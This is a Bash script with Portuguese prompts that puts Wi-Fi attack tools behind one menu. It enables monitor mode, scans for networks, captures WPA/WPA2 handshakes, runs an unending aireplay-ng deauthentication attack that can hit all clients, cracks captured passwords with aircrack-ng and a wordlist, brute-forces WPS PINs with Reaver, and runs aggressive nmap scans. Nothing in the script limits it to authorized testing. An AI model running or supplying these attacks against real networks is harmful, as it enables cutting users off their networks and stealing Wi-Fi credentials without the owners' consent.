#!/bin/bash

# Função para verificar se o script está sendo executado como root
check_root() {
    if [ "$EUID" -ne 0 ]; then
        echo "Por favor, execute como root."
        exit 1
    fi
}

# Função para ativar o modo monitor
enable_monitor_mode() {
    read -p "Digite o nome da interface wireless (ex: wlan0): " iface
    sudo airmon-ng start "$iface"
    iface_mon="${iface}mon"
    echo "Interface em modo monitor: $iface_mon"
}

# Função para desativar o modo monitor
disable_monitor_mode() {
    read -p "Digite o nome da interface monitor (ex: wlan0mon): " iface_mon
    sudo airmon-ng stop "$iface_mon"
    echo "Modo monitor desativado para: $iface_mon"
}

# Função para escanear redes Wi-Fi com airodump-ng
scan_wifi_networks() {
    read -p "Digite o nome da interface monitor (ex: wlan0mon): " iface_mon
    echo "Iniciando escaneamento de redes Wi-Fi..."
    sudo airodump-ng --band abg --wps --manufacturer "$iface_mon"
}

# Função para capturar handshake WPA/WPA2
capture_handshake() {
    read -p "Digite o nome da interface monitor (ex: wlan0mon): " iface_mon
    read -p "Digite o BSSID do alvo: " bssid
    read -p "Digite o canal do alvo: " channel
    read -p "Digite o nome do arquivo de saída (sem extensão): " output
    echo "Iniciando captura de handshake..."
    sudo airodump-ng --bssid "$bssid" --channel "$channel" --write "$output" "$iface_mon"
}

# Função para realizar ataque de desautenticação
deauth_attack() {
    read -p "Digite o nome da interface monitor (ex: wlan0mon): " iface_mon
    read -p "Digite o BSSID do alvo: " bssid
    read -p "Digite o MAC do cliente (ou 'ff:ff:ff:ff:ff:ff' para todos): " client_mac
    echo "Iniciando ataque de desautenticação..."
    sudo aireplay-ng --deauth 0 -a "$bssid" -c "$client_mac" "$iface_mon"
}

# Função para quebrar senha WPA/WPA2 com aircrack-ng
crack_wpa() {
    read -p "Digite o caminho para o arquivo .cap: " cap_file
    read -p "Digite o caminho para a wordlist: " wordlist
    echo "Iniciando quebra de senha WPA/WPA2..."
    sudo aircrack-ng -w "$wordlist" "$cap_file"
}

# Função para escanear rede com nmap
nmap_scan() {
    read -p "Digite o IP ou range de IPs para escanear (ex: 192.168.0.0/24): " target
    echo "Iniciando escaneamento com Nmap..."
    sudo nmap -Pn -sS -T4 -A "$target"
}

# Função para ataque WPS com reaver
wps_attack() {
    read -p "Digite o nome da interface monitor (ex: wlan0mon): " iface_mon
    read -p "Digite o BSSID do alvo: " bssid
    read -p "Digite o canal do alvo: " channel
    echo "Iniciando ataque WPS com Reaver..."
    sudo reaver -i "$iface_mon" -b "$bssid" -c "$channel" -vv
}

# Função para iniciar captura com Wireshark
start_wireshark() {
    read -p "Digite o nome da interface monitor (ex: wlan0mon): " iface_mon
    echo "Iniciando Wireshark..."
    sudo wireshark -i "$iface_mon" &
}

# Menu principal
main_menu() {
    while true; do
        echo ""
        echo "====== Menu Principal ======"
        echo "1. Ativar modo monitor"
        echo "2. Desativar modo monitor"
        echo "3. Escanear redes Wi-Fi (airodump-ng)"
        echo "4. Capturar handshake WPA/WPA2"
        echo "5. Ataque de desautenticação (aireplay-ng)"
        echo "6. Quebrar senha WPA/WPA2 (aircrack-ng)"
        echo "7. Escanear rede com Nmap"
        echo "8. Ataque WPS (Reaver)"
        echo "9. Iniciar Wireshark"
        echo "0. Sair"
        echo "============================"
        read -p "Escolha uma opção: " choice
        case $choice in
            1) enable_monitor_mode ;;
            2) disable_monitor_mode ;;
            3) scan_wifi_networks ;;
            4) capture_handshake ;;
            5) deauth_attack ;;
            6) crack_wpa ;;
            7) nmap_scan ;;
            8) wps_attack ;;
            9) start_wireshark ;;
            0) echo "Saindo..."; exit 0 ;;
            *) echo "Opção inválida!" ;;
        esac
    done
}

# Execução do script
check_root
main_menu